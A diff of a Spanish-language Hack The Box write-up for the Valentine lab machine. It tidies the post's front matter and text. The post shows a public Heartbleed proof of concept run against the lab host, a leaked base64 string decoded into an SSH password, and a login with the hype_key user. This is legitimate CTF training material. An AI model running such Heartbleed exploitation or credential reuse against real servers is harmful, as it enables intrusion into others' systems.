@@ -1,22 +1,21 @@
 ---
 layout: single
 title: Valentine - Hack The Box
-excerpt: "Tocamos directorio activo"
+excerpt: "Esta es una máquina fácil que implica la vulnerabildiad 'heartbleed' propio del protocolo https y abuso de socketfiles"
 date: 2018-11-24
 classes: wide
 header:
-  teaser: /assets/images/htb-inteligence/inteligence1.png
+  teaser: /assets/images/htb-valentine/valentine1.png
 categories:
   - hackthebox
-  - infosec
+  - writeup
 tags:
   - hackthebox
-  - AD
-  - Windows  
+  - https vuln
+  - socketfiles  
 ---
 
 # 10.10.10.79 - Valentine
-
 ![](/assets/images/htb-valentine/valentine1.png)
 
 --------------
@@ -102,8 +101,10 @@ Nos hablan de la vulnerabilidad HEARTBLEED
 └─$ searchsploit -m multiple/remote/32764.py
 └─$ python2 32764.py 10.10.10.79 -p443 | tee archivo.txt
 ```
-Este exploit no me ha sacado nada interesante, pero he encontrado otro:
-```https://github.com/mpgn/heartbleed-PoC```
+
+Este exploit no me ha sacado nada interesante, pero he encontrado otro [heartbleed](https://github.com/mpgn/heartbleed-PoC)
+
+
 ```console
 └─$ python2 heartbleed-exploit.py 10.10.10.79
 Connecting...
@@ -116,15 +117,16 @@ Received heartbeat response in file out.txt
 WARNING : server returned more data than it should - server is vulnerable!
 └─$ cat out.txt | xxd -r
 ```
+
 Nada interesante. Hay que ejecutarlo varias veces...
-A la segunda vez nos leakea esto: ```$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=``` Como la cadena son letras, 
-numeros y un "=" suponemos que es base64
+A la segunda vez nos leakea esto: `$text=aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=` Como la cadena 
+son letras, numeros y un "=" suponemos que es base64
 ```console
 └─$ echo "aGVhcnRibGVlZGJlbGlldmV0aGVoeXBlCg=" | base64  -d
 heartbleedbelievethehype
 ```
-Parece la contraseña de ssh, el asunto es que ha sido un base64 porque supongo que el creador de la ma quinahabra utilizado su porpia herramienta 
-/decode para "cifrar" la contraseña.
+Parece la contraseña de ssh, el asunto es que ha sido un base64 porque supongo que el creador de 
+la maquina habra utilizado su porpia herramienta  "/decode" para "cifrar" la contraseña.
 Como la llave era hype_key, podemos entrar con ese usuario:
 
 -----------------------
